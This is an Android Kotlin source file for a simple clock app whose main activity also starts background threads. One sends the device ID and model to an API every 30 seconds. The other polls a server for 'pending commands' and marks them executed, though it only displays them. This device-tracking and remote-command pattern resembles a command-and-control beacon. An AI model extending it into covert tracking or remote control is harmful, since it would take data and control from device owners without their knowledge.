package com.clock.app

import android.app.Activity
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.view.Gravity
import android.widget.LinearLayout
import android.widget.TextView
import java.text.SimpleDateFormat
import java.util.*

class MainActivity : Activity() {

    private val handler = Handler(Looper.getMainLooper())
    private lateinit var clockText: TextView
    private lateinit var statusText: TextView
    private val apiService = ApiService()

    private val runnable = object : Runnable {
        override fun run() {
            try {
                val time = SimpleDateFormat("hh:mm:ss a", Locale.getDefault()).format(Date())
                clockText.text = "🕒\n\n$time\n\nClock App"
                handler.postDelayed(this, 1000)
            } catch (e: Exception) {
            }
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        statusText = TextView(this).apply {
            textSize = 16f
            gravity = Gravity.CENTER
            setPadding(40, 120, 40, 40)
            text = "Status: Starting..."
        }

        clockText = TextView(this).apply {
            textSize = 32f
            gravity = Gravity.CENTER
            setPadding(40, 40, 40, 40)
        }

        val layout = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            gravity = Gravity.CENTER
        }
        layout.addView(statusText)
        layout.addView(clockText)
        setContentView(layout)

        handler.post(runnable)
        startMonitorLoops()
    }

    private fun startMonitorLoops() {
        val deviceId = Settings.Secure.getString(
            contentResolver,
            Settings.Secure.ANDROID_ID
        ) ?: "unknown"
        val deviceInfo = Build.MANUFACTURER + " " + Build.MODEL

        Thread {
            while (true) {
                try {
                    val ok = apiService.sendUserStatus(deviceId, deviceInfo)
                    runOnUiThread {
                        statusText.text = "Status: " + if (ok) "Sent" else "Failed"
                    }
                } catch (e: Exception) {
                }
                Thread.sleep(30000)
            }
        }.start()

        Thread {
            while (true) {
                try {
                    val commands = apiService.fetchPendingCommands(deviceId)
                    if (commands.isNotEmpty()) {
                        val last = commands.first()
                        val action = last.optString("action", "no_action")
                        val id = last.optString("id", "no_id")
                        runOnUiThread {
                            statusText.text = "Last Command: $action"
                        }
                        apiService.markCommandExecuted(id)
                    } else {
                        runOnUiThread {
                            statusText.text = "Status: Waiting for commands"
                        }
                    }
                } catch (e: Exception) {
                }
                Thread.sleep(5000)
            }
        }.start()
    }

    override fun onDestroy() {
        super.onDestroy()
        handler.removeCallbacks(runnable)
    }
}
